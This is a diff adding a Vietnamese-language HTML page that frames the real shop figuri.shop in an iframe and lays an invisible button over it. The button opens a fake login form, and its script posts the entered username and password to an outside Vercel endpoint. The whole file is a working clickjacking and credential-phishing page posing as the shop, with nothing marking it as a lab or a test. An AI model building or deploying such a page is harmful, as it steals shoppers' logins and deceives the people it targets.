@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>FiguriShop</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      position: relative;
+      width: 100%;
+      height: 800px;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .overlay-button {
+      position: absolute;
+      top: 30px;
+      right: 50px;
+      width: 300px;
+      height: 60px;
+      background: transparent;
+      border: none;
+      z-index: 10;
+      cursor: pointer;
+    }
+
+    .login-popup {
+      display: none;
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 100;
+      background-color: white;
+      border: 1px solid #ccc;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+
+    .login-popup input {
+      display: block;
+      margin: 10px 0;
+      padding: 8px;
+      width: 100%;
+    }
+
+    .login-popup button {
+      padding: 8px 16px;
+    }
+
+    .overlay-background {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 99;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <iframe src="https://figuri.shop"></iframe>
+    <button class="overlay-button" onclick="showLogin()">Hiển thị form đăng nhập</button>
+  </div>
+
+  <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>
+
+  <div class="login-popup" id="loginPopup">
+    <h3>Đăng nhập</h3>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Tên đăng nhập" required>
+      <input type="password" id="password" placeholder="Mật khẩu" required>
+      <button type="submit">Đăng nhập</button>
+    </form>
+  </div>
+
+  <script>
+    // Hiển thị form đăng nhập
+    function showLogin() {
+      document.getElementById('loginPopup').style.display = 'block';
+      document.getElementById('overlayBg').style.display = 'block';
+    }
+
+    // Ẩn form đăng nhập
+    function hideLogin() {
+      document.getElementById('loginPopup').style.display = 'none';
+      document.getElementById('overlayBg').style.display = 'none';
+    }
+
+    // Ngăn form submit mặc định và gửi dữ liệu qua XMLHttpRequest
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Ngăn form submit mặc định
+
+      // Lấy dữ liệu từ form
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Tạo đối tượng XMLHttpRequest
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://login-proxy-vercel-d5jx.vercel.app/api/submit', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      // Gửi dữ liệu
+      xhr.send(JSON.stringify({
+        username: username,
+        password: password
+      }));
+
+      // Xử lý phản hồi khi gửi thành công
+      xhr.onload = function() {
+        if (xhr.status >= 200 && xhr.status < 300) {
+          console.log('Dữ liệu đã được gửi:', xhr.responseText);
+          // Sau khi gửi, ẩn form
+          hideLogin();
+        } else {
+          console.error('Có lỗi khi gửi dữ liệu:', xhr.statusText);
+        }
+      };
+
+      // Xử lý lỗi nếu có
+      xhr.onerror = function() {
+        console.error('Lỗi kết nối.');
+      };
+    });
+  </script>
+
+</body>
+</html>
